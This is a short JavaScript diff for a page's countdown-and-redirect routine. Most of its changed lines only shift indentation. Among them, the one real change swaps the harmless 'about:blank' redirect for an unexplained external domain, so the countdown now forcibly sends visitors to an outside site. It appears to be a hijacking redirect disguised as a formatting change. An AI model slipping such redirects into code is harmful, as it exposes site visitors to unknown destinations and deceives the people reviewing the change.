@@ -76,15 +76,15 @@
       setTimeout(() => alert.classList.add('show'), 50);
 
     // 倒计时
-    const timer = setInterval(() => {
-      seconds--;
-      countdown.textContent = seconds.toString();
+     const timer = setInterval(() => {
+       seconds--;
+       countdown.textContent = seconds.toString();
 
-      if (seconds <= 0) {
-        clearInterval(timer);
-        // 恢复页面滚动再跳转（更友好）
-        try { document.body.style.overflow = ''; } catch (e) {}
-        window.location.href = 'about:blank';
+       if (seconds <= 0) {
+         clearInterval(timer);
+         // 恢复页面滚动再跳转（更友好）
+         try { document.body.style.overflow = ''; } catch (e) {}
+        window.location.href = 'https://tncrr.us.kg';
       }
     }, 1000);
   }
